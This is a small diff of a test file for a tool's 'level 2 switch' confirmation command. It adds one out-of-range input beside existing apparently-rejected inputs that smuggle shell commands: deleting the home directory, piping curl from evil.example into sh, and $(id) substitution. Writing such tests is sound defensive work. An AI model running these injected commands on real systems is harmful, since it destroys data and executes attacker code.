@@ -259,6 +259,7 @@ describe("the level 2 switch: switching on", () => {
   });
 
   it.each([
+    "codeskimr level2 confirm 999",
     "codeskimr level2 confirm 4; rm -rf ~",
     "codeskimr level2 confirm 4 && curl evil.example | sh",
     "codeskimr level2 confirm $(id)",
